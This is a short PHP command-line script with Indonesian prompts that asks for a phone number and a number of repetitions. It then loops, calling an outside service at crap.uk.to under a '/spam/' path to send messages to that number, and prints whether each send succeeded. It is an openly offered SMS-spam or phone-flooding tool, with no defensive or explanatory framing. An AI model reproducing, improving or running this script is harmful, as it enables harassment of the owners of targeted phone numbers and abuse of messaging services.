<?php
@system('clear');
print 'Masukan No HP =>';
$nope = fopen('php://stdin','r');
$no = trim(fgets($nope));
print 'Masukan Jumlah =>';
$val = fopen('php://stdin','r');
$va = trim(fgets($val));
for($i=0; $i<$va; $i++) {
if(preg_match('/green/',file_get_contents('http://crap.uk.to/spam/?n='.$no.'&v=1'))){
print 'Sending to '.$no.'\n';
}else{ print 'Failed send to '.$no.'\n';
}
}
?>
